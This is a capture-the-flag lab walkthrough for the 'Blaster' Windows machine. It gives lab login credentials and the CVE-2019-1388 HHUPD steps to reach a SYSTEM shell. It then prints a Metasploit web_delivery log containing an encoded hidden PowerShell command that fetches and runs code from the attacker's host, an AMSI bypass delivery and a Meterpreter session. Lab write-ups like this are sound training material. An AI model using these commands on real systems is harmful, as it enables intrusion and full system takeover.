---
sidebar_position: 1
title: Blaster
sidebar_label: Exploitation
description: A blast from the past!
keywords: [blaster, tryhackme, ctf, pentesting, guide, docs, tutorial, enumeration, exploitation, nmap, ffuf, privilege escalation, hhupd, CVE-2019-1388]
---

## HHUPD - CVE-2019-1388

We can login on the Machine using **RDP (Remote Desktop Protocol)** with the following Credentials: <b style={{ color: 'Chartreuse' }}>Wade</b><b style={{ color: 'Grey' }}>:</b><b style={{ color: 'Coral' }}>parzival</b>

<br/>


- `[1]` Uploading the <b style={{ color: 'DeepSkyBlue' }}>hhupd.exe</b> on the <span style={{fontWeight: 'Bold'}}>Target Machine. [In this case the Exploit is already Present on the Target Machine.</span> 
- `[2]` In the **Properties** of the Downloaded Executable: **`[Unblock the File]`**
- `[3]` Run the Executable as <span style={{fontWeight: 'Bold'}}>Administrator.</span>
- `[4]` **Chose:** **`[Show Information about this Publisher's Certificate]`**
- `[5]` **Chose:** **`[VeriSign Commercial Software Publishers CA].`** This Causes to Launch a **Browser Process** as <b style={{ color: 'Red' }}>NT AUTHORITY\SYSTEM</b>
- `[6]` **Chose:** **`Browser --> Tools --> File --> Save as...`**
- `[7]` **Navigate To:** **`C:\Windows\System32`.** Search for `cmd.exe` by using **`[*.* - cmd]`** in the **File Name.**
- `[8]` Run <b style={{ color: 'DeepSkyBlue' }}>cmd.exe</b> as <span style={{fontWeight: 'Bold'}}>Administrator.</span>
- `[9]` The **SHELL** is going to Open with **Administrator Rights:** <b style={{ color: 'Red' }}>NT AUTHORITY\SYSTEM</b>

<br/>

---
## Reverse SHELL

- <b style={{ color: 'HotPink' }}>Using:</b> <span style={{fontWeight: 'Bold'}}>exploit/multi/script/web_delivery</span>
- <b style={{ color: 'HotPink' }}>Target:</b> <span style={{fontWeight: 'Bold'}}>PSH (PowerShell)</span>
- <b style={{ color: 'HotPink' }}>PAYLOAD:</b> <span style={{fontWeight: 'Bold'}}>windows/meterpreter/reverse_http</span>
- **`Copy - Paste`** the `PSH` Payload on Windows **Terminal** that has been Opened using <b style={{ color: 'DeepSkyBlue' }}>hhupd.exe</b>

```log
Module options (exploit/multi/script/web_delivery):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)


Payload options (windows/meterpreter/reverse_http):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.20.30      yes       The local listener hostname
   LPORT     4444             yes       The local listener port
   LURI                       no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   2   PSH

[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started HTTP reverse handler on http://10.10.20.30:4444
[*] Using URL: http://10.10.20.30:8080/fYqJ9hR
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABhAGoAdQBPAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAGEAagB1AE8ALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABhAGoAdQBPAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAxAC4ANwAyAC4ANQA3ADoAOAAwADgAMAAvAGYAWQBxAEoAOQBoAFIALwBDAEgASAA1AGgAbQAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAxAC4ANwAyAC4ANQA3ADoAOAAwADgAMAAvAGYAWQBxAEoAOQBoAFIAJwApACkAOwA=
[*] 10.10.155.185    web_delivery - Delivering AMSI Bypass (1381 bytes)
[*] 10.10.155.185    web_delivery - Delivering Payload (3926 bytes)
[!] http://10.10.20.30:4444 handling request from 10.10.155.185; (UUID: 10d0btts) Without a database connected that payload UUID tracking will not work!
[*] http://10.10.20.30:4444 handling request from 10.10.155.185; (UUID: 10d0btts) Staging x86 payload (176732 bytes) ...
[!] http://10.10.20.30:4444 handling request from 10.10.155.185; (UUID: 10d0btts) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (10.10.20.30:4444 -> 127.0.0.1) at 2022-10-10 04:44:39 +0200
```

<br/>

-  We have **System Rights:** <b style={{ color: 'Red' }}>NT AUTHORITY\SYSTEM</b>

```log
meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo 
Computer        : RETROWEB
OS              : Windows 2016+ (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```

---